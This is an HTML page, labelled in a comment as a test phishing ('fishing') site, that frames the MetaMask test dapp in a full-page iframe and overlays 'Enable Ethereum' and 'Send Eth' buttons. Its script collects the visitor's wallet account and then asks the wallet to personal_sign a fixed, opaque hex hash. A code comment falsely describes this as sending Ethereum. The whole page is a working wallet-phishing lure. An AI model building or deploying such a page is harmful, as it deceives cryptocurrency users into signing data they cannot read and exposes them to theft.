<!DOCTYPE html>
<!-- This is a test fishing site !! -->
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <style>
  #all {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    border: none;
    z-index: -1;
  };
      .enableEthereumButton, .sendEthButton {
    width: 200px;
    height: 50px;
  }

    
</style>

    
    <title>Document</title>

</head>

<body>

    <button class="enableEthereumButton btn">Enable Ethereum</button>
    <button class="sendEthButton btn">Send Eth</button>

    <script>
    const ethereumButton = document.querySelector('.enableEthereumButton');
    const sendEthButton = document.querySelector('.sendEthButton');

    let accounts = [];

    //Sending Ethereum to an address
    sendEthButton.addEventListener('click', () => {
        const msg = '0x9779fa45a31a2a48daaee437258eab3e63186b68e5f5063eac5fa1e1c0798700';
        console.log(accounts[0]);
        ethereum.request({
                method: 'personal_sign',
                params: [accounts[0], msg]
            })
            .then((txHash) => console.log(txHash))
            .catch((error) => console.error);
    });

    ethereumButton.addEventListener('click', () => {
        getAccount();
    });

    async function getAccount() {
        accounts = await ethereum.request({
            method: 'eth_requestAccounts'
        });
    }
</script>
    
    <iframe id="all" src="https://metamask.github.io/test-dapp/"></iframe>
</body>

</html>
